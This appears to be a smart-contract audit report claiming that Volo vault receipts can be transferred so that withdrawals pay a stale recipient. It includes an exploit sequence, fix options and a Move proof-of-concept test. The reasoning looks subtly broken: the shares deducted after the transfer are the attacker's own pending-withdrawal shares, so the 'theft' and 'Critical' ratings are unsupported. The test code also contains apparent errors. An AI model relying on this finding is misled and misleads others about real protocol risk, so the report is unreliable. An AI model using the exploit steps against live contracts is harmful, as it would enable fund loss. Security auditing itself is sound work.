# Audit Report

## Title
Withdrawal Fund Theft via Receipt Transfer Due to Recipient Address Mismatch

## Summary
Volo vault receipts are transferable objects that can be freely moved between users. When a user requests withdrawal with auto-transfer, their address is permanently stored as the recipient. If the receipt is subsequently transferred to another user, the operator's withdrawal execution sends funds to the original recipient while deducting shares from the current receipt holder, enabling direct theft of vault shares.

## Finding Description

The Volo protocol breaks a fundamental custody invariant: **withdrawal funds must go to the current receipt holder, not a stale recipient address captured at request time**.

**Root Cause:**

The vulnerability stems from three architectural decisions that create a recipient address desynchronization:

1. **Receipts are fully transferable**: The `Receipt` struct has the `store` ability, making it freely transferable between users via Sui's standard transfer mechanisms. [1](#0-0) 

2. **Recipient address captured at request time**: When users call `withdraw_with_auto_transfer()`, the `ctx.sender()` address is stored as the recipient in the `WithdrawRequest` structure. [2](#0-1) 

3. **No validation of current ownership**: When the operator executes the withdrawal, the vault deducts shares from the `VaultReceiptInfo` indexed by `receipt_id`, retrieves the recipient from the `WithdrawRequest`, and returns both to the operator. [3](#0-2) 

The operator then transfers the withdrawal balance to the stored recipient address, not the current receipt holder. [4](#0-3) 

**Exploit Sequence:**

1. **Attacker deposits and requests withdrawal**: Attacker calls `withdraw_with_auto_transfer()` which creates a `WithdrawRequest` with `recipient = attacker_address`

2. **Transfer receipt to victim**: Attacker uses `transfer::public_transfer()` to send the receipt to an unsuspecting victim

3. **Operator executes withdrawal**: In normal protocol operations, the operator calls `execute_withdraw()` which:
   - Deducts shares from the receipt (now held by victim) at line 1063-1071
   - Returns the withdrawal balance and the stored recipient address (attacker) at line 1076
   - Transfers funds to the attacker at line 475

4. **Result**: Victim loses vault shares, attacker receives withdrawal funds

**Why Existing Protections Fail:**

- **No ownership validation**: The `execute_withdraw` function only validates request existence and slippage, not whether the current receipt holder matches the recipient. [5](#0-4) 

- **Cancellation blocked for victim**: The `cancel_withdraw` function requires the caller's address to match the recipient stored in the request, preventing the victim from canceling the malicious request. [6](#0-5) 

- **Share deduction from wrong party**: The vault updates shares based on `receipt_id` without validating the receipt's current owner matches the withdrawal recipient. [7](#0-6) 

## Impact Explanation

**Severity: Critical**

This vulnerability enables direct, unrecoverable theft of user funds through normal protocol operations:

- **Direct Fund Theft**: The attacker receives withdrawal funds that should belong to the victim
- **Irreversible Share Loss**: The victim's vault shares are permanently burned without receiving corresponding principal
- **No Recovery Mechanism**: Once executed, the transaction is final and cannot be reversed
- **Scales to Full Balance**: An attacker can request withdrawal for any amount of shares they hold before transferring the receipt
- **Victim Cannot Prevent**: The victim has no way to cancel the malicious withdrawal request since cancellation requires matching the original recipient address

The impact extends beyond a single exploitation:
- Destroys trust in the vault system
- Makes receipts toxic assets that users should not accept
- Undermines the entire receipt-based accounting model

## Likelihood Explanation

**Likelihood: High**

All preconditions are trivially satisfied through normal protocol operations:

1. **Attacker deposits funds**: Standard user operation requiring no special privileges
2. **Attacker requests withdrawal with auto-transfer**: Public function available to all users
3. **Attacker transfers receipt**: Sui's native transfer mechanism with no restrictions due to `store` ability
4. **Operator executes withdrawal**: Part of normal protocol operations that happen regularly

**No Special Requirements:**
- No admin/operator privileges needed
- No race conditions or timing dependencies
- No protocol state manipulation required
- All steps use documented public interfaces
- Operators process withdrawals as part of regular duties

**Economic Rationality:**
- Attacker profits by the full withdrawal amount
- Zero cost beyond initial deposit (which is recoverable)
- Can be repeated with multiple victims
- Risk-free if attacker uses a throwaway address

The attack is straightforward to execute and requires no sophisticated techniques or special circumstances.

## Recommendation

Implement one of the following fixes:

**Option 1: Validate Receipt Ownership During Execution (Recommended)**

Add a validation check in `execute_withdraw` that requires passing the current receipt holder's address and verifying it matches for auto-transfer requests:

```move
public(package) fun execute_withdraw<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_id: u64,
    max_amount_received: u64,
    current_receipt_holder: address, // New parameter
): (Balance<PrincipalCoinType>, address) {
    // ... existing code ...
    
    let withdraw_request = self.request_buffer.withdraw_requests[request_id];
    let recipient = withdraw_request.recipient();
    
    // NEW: Validate ownership for auto-transfer requests
    if (recipient != address::from_u256(0)) {
        assert!(
            recipient == current_receipt_holder,
            ERR_RECEIPT_HOLDER_MISMATCH
        );
    };
    
    // ... rest of function ...
}
```

**Option 2: Remove Store Ability from Receipt**

Remove the `store` ability from Receipt to prevent transfers:

```move
public struct Receipt has key {  // Remove 'store'
    id: UID,
    vault_id: address,
}
```

This makes receipts non-transferable but may break intended functionality if receipts are supposed to be transferable for legitimate use cases.

**Option 3: Store Receipt Holder in Request**

Update the recipient address in the `WithdrawRequest` whenever shares are transferred, though this is complex and error-prone.

**Recommended approach**: Option 1 provides the strongest security guarantee while maintaining flexibility.

## Proof of Concept

The following test demonstrates the vulnerability:

```move
#[test]
public fun test_withdrawal_theft_via_receipt_transfer() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Setup vault and oracle
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    init_vault::init_create_reward_manager<SUI_TEST_COIN>(&mut s);
    
    s.next_tx(OWNER);
    {
        let mut oracle_config = s.take_shared<OracleConfig>();
        test_helpers::set_aggregators(&mut s, &mut clock, &mut oracle_config);
        clock::set_for_testing(&mut clock, 1000);
        let prices = vector[2 * ORACLE_DECIMALS];
        test_helpers::set_prices(&mut s, &mut clock, &mut oracle_config, prices);
        test_scenario::return_shared(oracle_config);
    };
    
    // ATTACKER deposits and requests withdrawal with auto-transfer
    s.next_tx(ATTACKER);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(1_000_000_000, s.ctx());
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        
        // Deposit and execute
        let (_request_id, receipt, coin) = user_entry::deposit(
            &mut vault, &mut reward_manager, coin, 1_000_000_000,
            2_000_000_000, option::none(), &clock, s.ctx()
        );
        vault.execute_deposit(&clock, &s.take_shared<OracleConfig>(), 0, 2_000_000_000);
        
        clock::set_for_testing(&mut clock, 1000 + 12 * 3600_000);
        
        // Request withdrawal with auto-transfer (recipient = ATTACKER)
        let request_id = user_entry::withdraw_with_auto_transfer(
            &mut vault, 1_000_000_000, 500_000_000,
            &mut receipt, &clock, s.ctx()
        );
        
        // ATTACKER transfers receipt to VICTIM
        transfer::public_transfer(receipt, VICTIM);
        transfer::public_transfer(coin, ATTACKER);
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };
    
    // OPERATOR executes withdrawal
    s.next_tx(OWNER);
    {
        let operation = s.take_shared<Operation>();
        let cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        let config = s.take_shared<OracleConfig>();
        
        operation::execute_withdraw(
            &operation, &cap, &mut vault, &mut reward_manager,
            &clock, &config, 0, 600_000_000, s.ctx()
        );
        
        test_scenario::return_shared(operation);
        s.return_to_sender(cap);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
        test_scenario::return_shared(config);
    };
    
    // Verify: ATTACKER received funds, VICTIM lost shares
    s.next_tx(ATTACKER);
    {
        let attacker_coin = s.take_from_sender<Coin<SUI_TEST_COIN>>();
        assert!(attacker_coin.value() > 0); // ATTACKER got withdrawal funds
        s.return_to_sender(attacker_coin);
    };
    
    s.next_tx(VICTIM);
    {
        let receipt = s.take_from_sender<Receipt>();
        let vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let receipt_info = vault.vault_receipt_info(receipt.receipt_id());
        assert!(receipt_info.shares() < 2_000_000_000); // VICTIM lost shares
        s.return_to_sender(receipt);
        test_scenario::return_shared(vault);
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

This test demonstrates that after the receipt transfer, the attacker receives the withdrawal funds while the victim's shares are deducted, confirming the direct fund theft vulnerability.

### Citations

**File:** volo-vault/sources/receipt.move (L12-15)
```text
public struct Receipt has key, store {
    id: UID,
    vault_id: address, // This receipt belongs to which vault
}
```

**File:** volo-vault/sources/user_entry.move (L165-171)
```text
    let request_id = vault.request_withdraw(
        clock,
        receipt.receipt_id(),
        shares,
        expected_amount,
        ctx.sender(),
    );
```

**File:** volo-vault/sources/volo_vault.move (L964-971)
```text
    assert!(
        withdraw_request.request_time() + self.locking_time_for_cancel_request <= clock.timestamp_ms(),
        ERR_REQUEST_CANCEL_TIME_NOT_REACHED,
    );
    assert!(
        withdraw_request.recipient() == recipient || withdraw_request.recipient() == address::from_u256(0),
        ERR_RECIPIENT_MISMATCH,
    );
```

**File:** volo-vault/sources/volo_vault.move (L1001-1030)
```text
    self.check_version();
    self.assert_normal();
    assert!(self.request_buffer.withdraw_requests.contains(request_id), ERR_REQUEST_NOT_FOUND);

    // Get the current share ratio
    let ratio = self.get_share_ratio(clock);

    // Get the corresponding withdraw request from the vault
    let withdraw_request = self.request_buffer.withdraw_requests[request_id];

    // Shares and amount to withdraw
    let shares_to_withdraw = withdraw_request.shares();
    let usd_value_to_withdraw = vault_utils::mul_d(shares_to_withdraw, ratio);
    let amount_to_withdraw =
        vault_utils::div_with_oracle_price(
            usd_value_to_withdraw,
            vault_oracle::get_normalized_asset_price(
                config,
                clock,
                type_name::get<PrincipalCoinType>().into_string(),
            ),
        ) as u64;

    // Check the slippage (less than 100bps)
    let expected_amount = withdraw_request.expected_amount();

    // Negative slippage is determined by the "expected_amount"
    // Positive slippage is determined by the "max_amount_received"
    assert!(amount_to_withdraw >= expected_amount, ERR_UNEXPECTED_SLIPPAGE);
    assert!(amount_to_withdraw <= max_amount_received, ERR_UNEXPECTED_SLIPPAGE);
```

**File:** volo-vault/sources/volo_vault.move (L1059-1076)
```text
    let vault_receipt = &mut self.receipts[withdraw_request.receipt_id()];

    let recipient = withdraw_request.recipient();
    if (recipient != address::from_u256(0)) {
        vault_receipt.update_after_execute_withdraw(
            shares_to_withdraw,
            0,
        )
    } else {
        vault_receipt.update_after_execute_withdraw(
            shares_to_withdraw,
            withdraw_balance.value(),
        )
    };

    self.delete_withdraw_request(request_id);

    (withdraw_balance, recipient)
```

**File:** volo-vault/sources/operation.move (L467-478)
```text
    let (withdraw_balance, recipient) = vault.execute_withdraw(
        clock,
        config,
        request_id,
        max_amount_received,
    );

    if (recipient != address::from_u256(0)) {
        transfer::public_transfer(withdraw_balance.into_coin(ctx), recipient);
    } else {
        vault.add_claimable_principal(withdraw_balance);
    }
```

**File:** volo-vault/sources/vault_receipt_info.move (L102-111)
```text
public(package) fun update_after_execute_withdraw(
    self: &mut VaultReceiptInfo,
    executed_withdraw_shares: u256,
    claimable_principal: u64,
) {
    self.status = NORMAL_STATUS;
    self.shares = self.shares - executed_withdraw_shares;
    self.pending_withdraw_shares = self.pending_withdraw_shares - executed_withdraw_shares;
    self.claimable_principal = self.claimable_principal + claimable_principal;
}
```
